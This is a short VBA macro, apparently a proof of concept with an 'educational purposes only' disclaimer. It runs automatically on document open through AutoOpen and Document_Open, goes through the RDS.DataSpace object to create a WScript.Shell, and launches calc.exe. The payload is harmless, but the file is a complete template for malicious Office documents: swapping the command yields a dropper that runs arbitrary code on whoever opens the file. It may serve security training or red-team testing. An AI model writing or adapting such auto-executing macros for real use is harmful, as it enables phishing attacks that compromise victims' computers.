' ===============================================
' Author: Maerih
' Disclaimer: This code is for educational purposes only
' Use only in authorized testing environments
' ===============================================

Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
Sub MyMacro()
    Dim rds As Object
    On Error Resume Next
    Set rds = CreateObject("RDS.DataSpace")
    If Err.Number = 0 Then
        Dim factory As Object
        Set factory = rds.CreateObject("WScript.Shell", "")
        factory.Run "calc.exe", 1, False
    End If
    On Error GoTo 0
End Sub
